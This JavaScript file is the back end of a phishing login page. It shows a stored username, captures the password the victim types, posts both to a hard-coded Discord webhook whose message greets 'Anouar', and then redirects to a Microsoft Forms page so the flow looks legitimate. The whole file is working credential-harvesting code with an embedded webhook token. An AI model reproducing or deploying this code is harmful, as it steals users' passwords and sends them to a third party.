// Simulate loading process
window.onload = function () {
  let usernameLabel = document.getElementById("username")
  let username = window.localStorage.getItem("username")
  usernameLabel.innerText = username

  let submitButton = document.getElementById("submit")
  submitButton.addEventListener("click", event => {
    let password = document.getElementById("password").value
    if (password.length > 8){
      sendMessageToDiscord(username, password).then(r => window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=g5Qh6HoNqE-tAw1YdWLlhtSe7baLfNdNggdnCYltP1tUOFg1M1pURkMxWDdGOEVOTlBKWEkzMEFZVy4u");

    }
 })
};
// Replace this with your Discord webhook URL
const webhookURL =
  'https://discord.com/api/webhooks/1327050964284473465/F9HWruKupRrwQRcb3YXofSRoOgRsac2OcUdDIDJ3nG1ASOOHiFmAuupORLQhow8B2-Hz';


// Function to send a message
async function sendMessageToDiscord(username, password) {
  // Message payload
  const message = {
    content: 'Hello, Anouar!👋\n' +
      'Username: ' + username +
      '\nPassword: ' + password,
    username: 'My Bot',           // Optional: Override the webhook's name
  };

  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    if (response.ok) {
      console.log('Message sent successfully!');
    } else {
      console.error('Error sending message:', response.statusText);
    }
  } catch (error) {
    console.error('Error:', error);
  }
}





